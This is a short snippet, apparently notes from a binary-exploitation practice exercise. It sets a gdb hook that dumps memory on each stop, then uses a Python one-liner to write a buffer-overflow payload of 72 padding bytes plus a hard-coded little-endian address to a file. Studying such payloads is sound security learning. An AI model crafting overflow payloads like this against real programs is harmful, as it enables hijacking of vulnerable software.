# in gdb:
# 
# define hook-stop
# x/40x 0x0804a000
# end

python -c 'print "A"*72 + "\x64\x84\x04\x08" ' > /tmp/out